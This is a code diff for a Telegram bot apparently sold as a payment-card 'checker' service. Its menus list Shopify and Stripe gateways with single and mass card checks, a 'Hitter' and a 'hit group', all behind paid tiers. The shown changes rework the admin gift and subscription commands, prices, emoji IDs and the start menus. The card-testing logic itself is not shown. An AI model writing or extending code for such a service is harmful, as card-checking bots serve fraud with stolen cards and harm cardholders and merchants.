+            "  <code>/gift 6299808404 30d</code>\n\n"
+            "All gifts upgrade the recipient to <b>ULTIMATE</b> tier.",
             parse_mode=ParseMode.HTML,
             reply_markup=back_menu()
         )
         return
-    
+
+    # ---------- Parse user_id ----------
     try:
         target_user_id = int(context.args[0])
     except ValueError:
@@ -55536,40 +56054,95 @@ async def gift_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode=ParseMode.HTML
         )
         return
-    
-    # Get plan from arguments
-    plan_input = " ".join(context.args[1:]).lower().strip()
-    
-    # Check for aliases
-    if plan_input in GIFT_ALIASES:
-        plan_key = GIFT_ALIASES[plan_input]
+
+    # ---------- Parse plan / duration ----------
+    raw_input = " ".join(context.args[1:]).strip()
+    raw_lower = raw_input.lower()
+
+    tier = "ultimate"
+    duration_value = None
+    duration_type = None
+    plan_name = None
+    plan_emoji_char = "🔥"
+    plan_price_display = "Gift"
+
+    # ----- Step 1: try named plans first (Test, Lite, Crown, Member) -----
+    if raw_lower in GIFT_ALIASES:
+        plan_key = GIFT_ALIASES[raw_lower]
     else:
-        # Try to match plan name
         plan_key = None
         for key, plan in GIFT_PLANS.items():
-            if plan["name"].lower() == plan_input:
+            if plan["name"].lower() == raw_lower:
                 plan_key = key
                 break
-            if plan["display_name"].lower() == plan_input:
+            if plan["display_name"].lower() == raw_lower:
                 plan_key = key
                 break
-        
-        if not plan_key:
-            await update.message.reply_text(
-                f"❌ <b>Invalid Plan</b>\n\n"
-                f"Plan <code>{plan_input}</code> not found.\n\n"
-                f"<b>Available Plans:</b>\n"
-                f"• <code>Test</code> - 1 Day\n"
-                f"• <code>Lite</code> - 7 Days\n"
-                f"• <code>Crown</code> - 15 Days\n"
-                f"• <code>Member</code> - 30 Days",
-                parse_mode=ParseMode.HTML
-            )
-            return
-    
-    plan = GIFT_PLANS[plan_key]
-    
-    # Try to get target user info
+
+    if plan_key:
+        # Named plan matched
+        plan = GIFT_PLANS[plan_key]
+        plan_name = plan["name"]
+        duration_value = plan["duration"]
+        duration_type = plan.get("duration_type", "days")
+        plan_emoji_char = plan.get("emoji", "🔥")
+        plan_price_display = plan.get("price", "Gift")
+        tier = plan.get("tier", "ultimate")
+
+    else:
+        # ----- Step 2: try duration format (Nh / Nd) -----
+        m = re.match(r'^(\d+)\s*(h|hr|hrs|hour|hours|d|day|days)?$', raw_lower)
+        if m:
+            duration_value = int(m.group(1))
+            unit = (m.group(2) or "d").lower()
+
+            if duration_value <= 0:
+                await update.message.reply_text("❌ Duration must be greater than 0.")
+                return
+
+            if unit in ("h", "hr", "hrs", "hour", "hours"):
+                duration_type = "hours"
+                if duration_value > 24 * 30:
+                    await update.message.reply_text(
+                        "❌ Hour duration too large. Max <code>720h</code> (30 days).",
+                        parse_mode=ParseMode.HTML
+                    )
+                    return
+            else:
+                duration_type = "days"
+                if duration_value > 365:
+                    await update.message.reply_text(
+                        "❌ Day duration too large. Max <code>365d</code>.",
+                        parse_mode=ParseMode.HTML
+                    )
+                    return
+
+            plan_name = "Custom Gift"
+
+    # ----- Step 3: if neither matched, reject -----
+    if duration_value is None:
+        await update.message.reply_text(
+            f"❌ <b>Invalid input:</b> <code>{raw_input}</code>\n\n"
+            f"Use a <b>named plan</b> or a <b>duration</b>.\n\n"
+            f"<b>Named Plans:</b> <code>Test</code>, <code>Lite</code>, "
+            f"<code>Crown</code>, <code>Member</code>\n"
+            f"<b>Duration:</b> <code>&lt;number&gt;h</code> or "
+            f"<code>&lt;number&gt;d</code>\n\n"
+            f"Examples: <code>Test</code>, <code>Crown</code>, "
+            f"<code>1h</code>, <code>6h</code>, <code>30d</code>",
+            parse_mode=ParseMode.HTML
+        )
+        return
+
+    # ---------- Compute expiry ----------
+    if duration_type == "hours":
+        duration_text = f"{duration_value} hour{'s' if duration_value != 1 else ''}"
+        expiry_seconds = duration_value * 3600
+    else:
+        duration_text = f"{duration_value} day{'s' if duration_value != 1 else ''}"
+        expiry_seconds = duration_value * 86400
+
+    # ---------- Fetch target user info ----------
     try:
         target_user = await context.bot.get_chat(target_user_id)
         target_username = target_user.username or "NoUsername"
@@ -55581,90 +56154,77 @@ async def gift_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         target_username = "Unknown"
         target_first_name = f"User {target_user_id}"
         target_display = target_first_name
-    
-    # Get admin info
+        print(f"⚠️ Could not fetch target user info: {e}")
+
+    # ---------- Fetch admin display ----------
     admin_user = update.effective_user
     admin_display = admin_user.first_name
     if admin_user.username:
         admin_display += f" (@{admin_user.username})"
-    
-    # ============ DIRECTLY UPGRADE THE USER (NO KEY) ============
-    duration = plan["duration"]
-    duration_type = plan.get("duration_type", "days")
-    tier = plan["tier"]
-    
-    if duration_type == "hours":
-        expiry_seconds = duration * 3600
-        duration_text = f"{duration} hour{'s' if duration > 1 else ''}"
-    else:
-        expiry_seconds = duration * 86400
-        duration_text = f"{duration} day{'s' if duration > 1 else ''}"
-    
-    # Get user data and upgrade
+
+    # ---------- Apply upgrade ----------
     user_data = user_manager.get_user(target_user_id)
     original_tier = user_data.get("tier", "free")
-    
-    # Set new tier
+
     user_data["tier"] = tier
     user_data["upgraded_from"] = original_tier
     user_data["tier_expiry"] = time.time() + expiry_seconds
     user_data["gifted_by"] = user_id
-    user_data["gifted_plan"] = plan["name"]
+    user_data["gifted_plan"] = plan_name
+    user_data["gifted_duration"] = duration_text
     user_data["gifted_at"] = time.time()
     user_data["gift_count"] = user_data.get("gift_count", 0) + 1
-    
+
     user_manager.save_users()
-    
-    # Update cache if exists
+
     if hasattr(user_manager, 'cache') and target_user_id in user_manager.cache:
         user_manager.cache[target_user_id] = user_data
-    
-    # ============ SEND CONFIRMATION TO ADMIN ============
+
+    # ---------- Confirmation to admin ----------
+    expiry_dt = datetime.fromtimestamp(time.time() + expiry_seconds).strftime('%Y-%m-%d %H:%M')
+
     await update.message.reply_text(
         f"✅ <b>Plan Gifted Successfully!</b>\n\n"
-        f"🎁 <b>Plan:</b> {plan['emoji']} {plan['display_name']}\n"
+        f"🎁 <b>Plan:</b> {plan_emoji_char} {plan_name}\n"
         f"⏱️ <b>Duration:</b> {duration_text}\n"
         f"👤 <b>Recipient:</b> {target_display}\n"
         f"🆔 <b>User ID:</b> <code>{target_user_id}</code>\n"
-        f"━━━━━━━━━━━━━━━━━━━\n"
+        f"\n"
         f"🔄 <b>Upgraded From:</b> {original_tier.upper()}\n"
         f"👑 <b>New Tier:</b> {tier.upper()}\n"
-        f"📅 <b>Expires:</b> {datetime.fromtimestamp(time.time() + expiry_seconds).strftime('%Y-%m-%d %H:%M')}\n"
-        f"━━━━━━━━━━━━━━━━━━━\n"
+        f"📅 <b>Expires:</b> {expiry_dt}\n"
+        f"\n"
         f"💀 <b>Bot</b> ➛ @BLADESARKS_V3bot",
         parse_mode=ParseMode.HTML,
         reply_markup=back_menu()
     )
-    
-    # ============ SEND NOTIFICATION TO TARGET USER ============
+
+    # ---------- Notify the recipient ----------
     try:
         await context.bot.send_message(
             chat_id=target_user_id,
             text=(
                 f"🎁 <b>You've Received a Gift!</b>\n\n"
-
-                f"👑 <b>Plan:</b> {plan['emoji']} {plan['display_name']}\n"
+                f"👑 <b>Plan:</b> {plan_emoji_char} {plan_name}\n"
                 f"⏱️ <b>Duration:</b> {duration_text}\n"
-
+                f"📅 <b>Expires:</b> {expiry_dt}\n\n"
                 f"🎉 Your account has been upgraded automatically!\n"
-                f"💀 <b>Bot</b> ➛ @BLADESARKS_V3bot"
             ),
             parse_mode=ParseMode.HTML
         )
         print(f"✅ Gift notification sent to user {target_user_id}")
-        
     except Exception as e:
         await update.message.reply_text(
             f"⚠️ <b>User Not Reachable</b>\n\n"
             f"The user has been upgraded but could not be notified.\n"
             f"They may have blocked the bot.\n\n"
             f"👑 <b>New Tier:</b> {tier.upper()}\n"
-            f"📅 <b>Expires:</b> {datetime.fromtimestamp(time.time() + expiry_seconds).strftime('%Y-%m-%d %H:%M')}",
+            f"📅 <b>Expires:</b> {expiry_dt}",
             parse_mode=ParseMode.HTML
         )
         print(f"⚠️ Could not send gift notification to user {target_user_id}: {e}")
-    
-    # ============ SEND NOTIFICATION TO HIT GROUP ============
+
+    # ---------- Notify hit group ----------
     await send_gift_notification(
         context=context,
         admin_id=user_id,
@@ -55672,12 +56232,16 @@ async def gift_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         target_user_id=target_user_id,
         target_username=target_username,
         target_first_name=target_first_name,
-        plan=plan,
+        plan={
+            "name": plan_name,
+            "display_name": plan_name,
+            "emoji": plan_emoji_char,
+            "price": plan_price_display
+        },
         duration_text=duration_text,
         original_tier=original_tier,
         tier=tier
     )
-
 
 async def send_gift_notification(context: ContextTypes.DEFAULT_TYPE, 
                                   admin_id: int, admin_name: str,
@@ -55696,7 +56260,7 @@ async def send_gift_notification(context: ContextTypes.DEFAULT_TYPE,
         "skull": "5042167377869932162",
         "target": "5377336227533969892",
         "id": "5307905813451397794",
-        "money": "6002386288612653951",
+        "money": "5438548621127615575",
         "receipt": "5226929552319594190",
     }
     
@@ -55771,7 +56335,7 @@ async def gift_list_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"{fire_emoji} <b>Plan 1: Lɪᴛᴇ</b>\n"
         f"   Aᴄᴄᴇꜱꜱ ➺ Lite\n"
         f"   Sᴘᴀɴ ➺ 7 Dᴀʏꜱ\n"
-        f"   Pʀɪᴄᴇ ➺ $7\n\n"
+        f"   Pʀɪᴄᴇ ➺ $5\n\n"
         f"{fire_emoji} <b>Plan 2: Cʀᴏᴡɴ</b>\n"
         f"   Aᴄᴄᴇꜱꜱ ➺ Crown\n"
         f"   Sᴘᴀɴ ➺ 15 Dᴀʏꜱ\n"
@@ -61747,6 +62311,8 @@ async def stopall_callback_handler(update: Update, context: ContextTypes.DEFAULT
             reply_markup=back_menu()
         )
 
+
+
 # ============ REMOVE PLAN COMMAND ============
 # Add this to your f13.py
 
@@ -61827,26 +62393,21 @@ async def rplan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup=back_menu()
     )
     
+    diamond_emoji = premium_emoji(PREMIUM_EMOJI_IDS.get("diamond", "5427168083074628963"), "💎")
+    
     # Send notification to the user
     try:
+        # ============ UPDATED MESSAGE WITH PREMIUM EMOJIS ============
+        # Using premium_emoji helper with fallback emojis from Shopify gateway
         await context.bot.send_message(
             chat_id=target_user_id,
             text=(
-                f"🔄 <b>Your Plan Has Been Removed</b>\n\n"
-                f"💎 To upgrade again Use /pay \n"
+                f"{diamond_emoji} <b>Your Plan Has Been Removed</b>\n\n"
+                f"  <b>To upgrade again, use</b> /buy\n\n"
             ),
             parse_mode=ParseMode.HTML
         )
         print(f"📢 Notification sent to user {target_user_id} about plan removal")
-        
-        # Also send to hit notification group
-        await send_plan_removal_notification(
-            context=context,
-            user_id=target_user_id,
-            username=username,
-            first_name=first_name,
-            old_tier=old_tier
-        )
         
     except Exception as e:
         print(f"⚠️ Could not notify user {target_user_id}: {e}")
@@ -68309,85 +68870,126 @@ async def dork_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # --- COMMAND HANDLERS ---
 
+async def debugemoji_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    Admin-only: test every emoji ID in PREMIUM_EMOJI_IDS and report
+    which ones Telegram accepts and which ones it rejects.
+    """
+    if update.effective_user.id != OWNER_ID:
+        await update.message.reply_text("❌ Admin only.")
+        return
+
+    await update.message.reply_text(
+        f"🧪 Testing {len(PREMIUM_EMOJI_IDS)} emoji IDs…\n"
+        f"Results will appear in the console.",
+    )
+
+    valid = []
+    invalid = []
+
+    for key, emoji_id in PREMIUM_EMOJI_IDS.items():
+        # Skip anything that's obviously not a valid ID format
+        if not isinstance(emoji_id, str) or not emoji_id.isdigit() or len(emoji_id) < 15:
+            invalid.append((key, emoji_id, "bad format (not a long numeric ID)"))
+            print(f"❌ [EMOJI] {key}: {emoji_id} → bad format")
+            continue
+
+        try:
+            # Send a tiny isolated test message
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text=f'<tg-emoji emoji-id="{emoji_id}">⭐</tg-emoji> <code>{key}</code>',
+                parse_mode=ParseMode.HTML,
+            )
+            valid.append((key, emoji_id))
+            print(f"✅ [EMOJI] {key}: {emoji_id}")
+            # Small pause to avoid flood limits
+            await asyncio.sleep(0.5)
+        except BadRequest as e:
+            err = str(e).lower()
+            invalid.append((key, emoji_id, str(e)))
+            print(f"❌ [EMOJI] {key}: {emoji_id} → {e}")
+        except Exception as e:
+            invalid.append((key, emoji_id, str(e)))
+            print(f"⚠️ [EMOJI] {key}: {emoji_id} → unexpected: {e}")
+
+    # ---- Build summary ----
+    summary = (
+        f"🧪 <b>Emoji ID Test Results</b>\n\n"
+        f"✅ Valid: <b>{len(valid)}</b>\n"
+        f"❌ Invalid: <b>{len(invalid)}</b>\n"
+    )
+
+    if invalid:
+        summary += "\n<b>❌ Broken IDs:</b>\n"
+        for key, eid, reason in invalid:
+            summary += f"• <code>{key}</code> → <code>{eid}</code>\n"
+            summary += f"  └─ {reason[:80]}\n"
+
+    await update.message.reply_text(summary, parse_mode=ParseMode.HTML)
+
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Start command with menu"""
     user = update.effective_user
     user_manager.update_user_info(user.id, user.username or "NoUsername", user.first_name)
-    stats = user_manager.get_user_stats(user.id)
-    
+
     if not await check_group_membership(update, context):
         return
-    
-    tier = stats['tier']
-    
-    # Premium emoji IDs
-    PREMIUM_EMOJI_IDS = {
-        "diamond": "5427168083074628963",
-        "fire": "5471133374264684999",
-        "skull": "5042167377869932162",
-        "target": "5377336227533969892",
-        "alien": "5869573060030683138",
-        "money": "6002386288612653951",
-        "smile": "6230927657257668107",
-        "devil": "6268012745776588577",
-        "bin": "6237654950432742406",
-        "approved": "6267264360482084046",
-        "users": "5784914081165087232",
-        "card": "5465465194056525619",
-        "star": "6282793227057632654",
-        "trophy": "5188344996356448758",
-        "flash": "5397857289216484878",
-        "clock": "5262540380301191210",
-        "globe": "5447410659077661506",
-        "lock": "5197288647275071607",
-        "info": "5042306247047513767",
-        "pink": "5041796412954641308",
-        "flower": "6230927657257668107",
-        "doller": "5197434882321567830",
-        "toy": "5249244862359812334",
-        "stats": "5028746137645876535",
-    }
-    
-    tier_emojis = {"free": "🆓", "premium": "🔥", "ultimate": "😈", "admin": "🏴"}
-    tier_emoji = tier_emojis.get(tier, "🆓")
-    current_time = datetime.now().strftime("%I:%M %p")
-    
-    caption = (
-        f'{premium_emoji(PREMIUM_EMOJI_IDS["diamond"], "💎")}'
-        f'{premium_emoji(PREMIUM_EMOJI_IDS["diamond"], "💎")}'
-        f'{premium_emoji(PREMIUM_EMOJI_IDS["diamond"], "💎")} '
-        f'<b>BLADESARKS(CHECKER)</b>\n\n'
-        f'{premium_emoji(PREMIUM_EMOJI_IDS["star"], "⭐")} '
-        f'<b>Status</b> : Active ✔\n\n'
-        f'{premium_emoji(PREMIUM_EMOJI_IDS["bin"], "🆔")} '
-        f'<b>ID</b> <code>{user.id}</code>\n'
-        f'{premium_emoji(PREMIUM_EMOJI_IDS["users"], "👤")} '
-        f'<b>User</b> @{user.username or "None"}\n'
-        f'{premium_emoji(PREMIUM_EMOJI_IDS["card"], "📛")} '
-        f'<b>Name</b> {user.first_name} [ {tier_emoji} {tier.upper()} ]\n\n'
-        f'{premium_emoji(PREMIUM_EMOJI_IDS["clock"], "⏱️")} '
-        f'{current_time}\n\n'
-        f'{premium_emoji(PREMIUM_EMOJI_IDS["skull"], "💀")} '
-        f'<b>Bot</b> @BLADESARKS_V3bot'
+
+    # ============ BUILD USER DISPLAY VALUES ============
+    display_name = user.first_name or "User"
+    username     = user.username or "NoUsername"
+
+    tier = user_manager.get_tier(user.id)
+    tier_upper = tier.upper()
+
+    # Credits — paid tiers get ∞, free users get real balance
+    if tier in ("premium", "ultimate", "admin") or user.id == OWNER_ID:
+        credits_display = "∞ (Unlimited)"
+    else:
+        credits_display = str(get_user_credits(user.id))
+
+    # ============ PREMIUM EMOJIS ============
+    diamond_emoji   = premium_emoji(PREMIUM_EMOJI_IDS.get("diamond", "5427168083074628963"), "💎")
+    star_emoji      = premium_emoji(PREMIUM_EMOJI_IDS.get("star",    "6282793227057632654"), "⭐")
+    user_emoji      = premium_emoji(PREMIUM_EMOJI_IDS.get("users",   "5784914081165087232"), "👤")
+    id_emoji        = premium_emoji(PREMIUM_EMOJI_IDS.get("id",      "5307905813451397794"), "🆔")
+    card_emoji      = premium_emoji(PREMIUM_EMOJI_IDS.get("card",    "5465465194056525619"), "📛")
+    target_emoji    = premium_emoji(PREMIUM_EMOJI_IDS.get("target",  "5377336227533969892"), "🎯")
+    money_emoji     = premium_emoji(PREMIUM_EMOJI_IDS.get("money",   "5438548621127615575"), "💰")
+    skull_emoji     = premium_emoji(PREMIUM_EMOJI_IDS.get("skull",   "5042167377869932162"), "💀")
+    fllower_emoji     = premium_emoji(PREMIUM_EMOJI_IDS.get("fllower",   "6269135402855044481"), "📍")
+
+    # ============ MESSAGE ============
+    message = (
+        f"{diamond_emoji} <b>Welcome to BLADESARKS</b>\n\n"
+        f"{star_emoji} <b>Status :</b> Active ✔️\n\n"
+        f"{user_emoji} <b>User :</b> {display_name}\n"
+        f"{id_emoji} <b>ID :</b> <code>{user.id}</code>\n"
+        f"\n"
+        f"<b>Access ➳</b> {tier_upper}\n"
+        f"<b>Credits ➳</b> {credits_display}\n\n"
+        f"{fllower_emoji} <b>Dev ➳</b> <a href=\"https://t.me/lencax\">lencax</a>"
     )
-    
+
+    # ============ KEYBOARD ============
     keyboard = [
         [
-            InlineKeyboardButton("🛍️ Checker", callback_data='show_checker'),
-            InlineKeyboardButton("🎯 Hitter", callback_data='show_hitter')
+            InlineKeyboardButton(" Checker", callback_data='show_checker'),
+            InlineKeyboardButton(" Hitter",  callback_data='show_hitter'),
         ],
         [
-            InlineKeyboardButton("📋 Plans", callback_data='show_plans'),
-            InlineKeyboardButton("📞 Contact", callback_data='show_contact')
-        ]
+            InlineKeyboardButton(" Buy Now",   callback_data='show_plans'),
+            InlineKeyboardButton(" Contact", callback_data='show_contact'),
+        ],
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
-    
-    # ============ FIX: Send as TEXT message, NOT photo ============
+
     await update.message.reply_text(
-        caption,
+        message,
         parse_mode=ParseMode.HTML,
-        reply_markup=reply_markup
+        reply_markup=reply_markup,
+        disable_web_page_preview=True,
     )
 
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -68407,8 +69009,8 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "fire": "5471133374264684999",
         "skull": "5042167377869932162",
         "target": "5377336227533969892",
-        "alien": "5869573060030683138",
-        "money": "6002386288612653951",
+        "alien": "5298822932577937495",
+        "money": "5438548621127615575",
         "smile": "6230927657257668107",
         "devil": "6268012745776588577",
         "bin": "6237654950432742406",
@@ -68434,19 +69036,11 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         text = (
             f'{premium_emoji(PREMIUM_EMOJI_IDS["card"], "🛍️")} '
             f'<b>CHECKER GATEWAYS</b>\n\n'
-            f'1️⃣ <b>Shopify</b>\n'
+            f'\n'
+            f' <b>Shopify</b>\n'
             f'   /sh - Single check\n'
             f'   /msh - Mass check\n\n'
-            f'2️⃣ <b>Stripe $1</b>\n'
-            f'   /st - Single check\n'
-            f'   /mst - Mass check\n\n'
-            f'3️⃣ <b>Razorpay</b>\n'
-            f'   /rz - Single check\n'
-            f'   /mrz - Mass check\n\n'
-            f'4️⃣ <b>PayPal</b>\n'
-            f'   /pp - Single check\n'
-            f'   /mpp - Mass check\n\n'
-            f'5️⃣ <b> Stripe Auth </b>\n'
+            f' <b> Stripe Auth </b>\n'
             f'   /chk - Single check\n'
             f'   /mchk - Mass check\n\n'
         )
@@ -68478,7 +69072,6 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         text = (
             f" USE /buy"
             f" USE /starbuy "
-            
         )
         
         keyboard = [
@@ -68591,44 +69184,61 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     # ============ BACK MAIN ============
     elif query.data == 'back_main':
-        stats = user_manager.get_user_stats(user.id)
-        tier = stats['tier']
-        tier_emojis = {"free": "🆓", "premium": "🔥", "ultimate": "😈", "admin": "🏴"}
-        tier_emoji = tier_emojis.get(tier, "🆓")
+        # ============ RECALCULATE ALL VALUES HERE ============
+        user = update.effective_user
+        user_manager.update_user_info(user.id, user.username or "NoUsername", user.first_name)
         
-        current_time = datetime.now().strftime("%I:%M %p")
+        display_name = user.first_name or "User"
+        username     = user.username or "NoUsername"
+        tier = user_manager.get_tier(user.id)
+        tier_upper = tier.upper()
+        
+        # Credits — paid tiers get ∞, free users get real balance
+        if tier in ("premium", "ultimate", "admin") or user.id == OWNER_ID:
+            credits_display = "∞ (Unlimited)"
+        else:
+            credits_display = str(get_user_credits(user.id))
+        
+        # Reuse the same emoji variables
+        diamond_emoji   = premium_emoji(PREMIUM_EMOJI_IDS.get("diamond", "5427168083074628963"), "💎")
+        star_emoji      = premium_emoji(PREMIUM_EMOJI_IDS.get("star",    "6282793227057632654"), "⭐")
+        user_emoji      = premium_emoji(PREMIUM_EMOJI_IDS.get("users",   "5784914081165087232"), "👤")
+        id_emoji        = premium_emoji(PREMIUM_EMOJI_IDS.get("id",      "5307905813451397794"), "🆔")
+        card_emoji      = premium_emoji(PREMIUM_EMOJI_IDS.get("card",    "5465465194056525619"), "📛")
+        target_emoji    = premium_emoji(PREMIUM_EMOJI_IDS.get("target",  "5377336227533969892"), "🎯")
+        money_emoji     = premium_emoji(PREMIUM_EMOJI_IDS.get("money",   "5438548621127615575"), "💰")
+        skull_emoji     = premium_emoji(PREMIUM_EMOJI_IDS.get("skull",   "5042167377869932162"), "💀")
+        fllower_emoji   = premium_emoji(PREMIUM_EMOJI_IDS.get("fllower", "6269135402855044481"), "📍")
         
         text = (
-            f'{premium_emoji(PREMIUM_EMOJI_IDS["diamond"], "💎")}'
-            f'{premium_emoji(PREMIUM_EMOJI_IDS["diamond"], "💎")}'
-            f'{premium_emoji(PREMIUM_EMOJI_IDS["diamond"], "💎")} '
-            f'<b>BLADESARKS(CHECKER)</b>\n\n'
-            f'{premium_emoji(PREMIUM_EMOJI_IDS["star"], "⭐")} '
-            f'<b>Status</b> : Active ✔\n\n'
-            f'{premium_emoji(PREMIUM_EMOJI_IDS["bin"], "🆔")} '
-            f'<b>ID</b> <code>{user.id}</code>\n'
-            f'{premium_emoji(PREMIUM_EMOJI_IDS["users"], "👤")} '
-            f'<b>User</b> @{user.username or "None"}\n'
-            f'{premium_emoji(PREMIUM_EMOJI_IDS["card"], "📛")} '
-            f'<b>Name</b> {user.first_name} [ {tier_emoji} {tier.upper()} ]\n\n'
-            f'{premium_emoji(PREMIUM_EMOJI_IDS["clock"], "⏱️")} '
-            f'{current_time}\n\n'
-            f'{premium_emoji(PREMIUM_EMOJI_IDS["skull"], "💀")} '
-            f'<b>Bot</b> @BLADESARKS_V3bot'
+            f"{diamond_emoji} <b>Welcome to BLADESARKS</b>\n\n"
+            f"{star_emoji} <b>Status :</b> Active ✔️\n\n"
+            f"{user_emoji} <b>User :</b> {display_name}\n"
+            f"{id_emoji} <b>ID :</b> <code>{user.id}</code>\n"
+            f"\n"
+            f"<b>Access ➳</b> {tier_upper}\n"
+            f"<b>Credits ➳</b> {credits_display}\n\n"
+            f"{fllower_emoji} <b>Dev ➳</b> <a href=\"https://t.me/lencax\">lencax</a>"
         )
         
         keyboard = [
             [
-                InlineKeyboardButton("🛍️ Checker", callback_data='show_checker'),
-                InlineKeyboardButton("🎯 Hitter", callback_data='show_hitter')
+                InlineKeyboardButton(" Checker", callback_data='show_checker'),
+                InlineKeyboardButton(" Hitter",  callback_data='show_hitter'),
             ],
             [
-                InlineKeyboardButton("📋 Plans", callback_data='show_plans'),
-                InlineKeyboardButton("📞 Contact", callback_data='show_contact')
-            ]
+                InlineKeyboardButton(" Buy Now",   callback_data='show_plans'),
+                InlineKeyboardButton(" Contact", callback_data='show_contact'),
+            ],
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
-        await query.edit_message_text(text=text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
+        
+        await query.edit_message_text(
+            text=text,
+            parse_mode=ParseMode.HTML,
+            reply_markup=reply_markup,
+            disable_web_page_preview=True,
+        )
     
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await verify_group_access(update, context):
@@ -76414,6 +77024,12 @@ def main():
     app.add_handler(CommandHandler("giftstats", gift_stats_command))
     
     app.add_handler(CommandHandler("tn", tn_command))
+    app.add_handler(CommandHandler("debugemoji", debugemoji_command))
+    
+    app.add_handler(CommandHandler("scanfakes", scanfakes_command))
+    
+    app.add_handler(CommandHandler("g_code", g_code_command))
+    app.add_handler(CommandHandler("claim", claim_command))
 
     
 
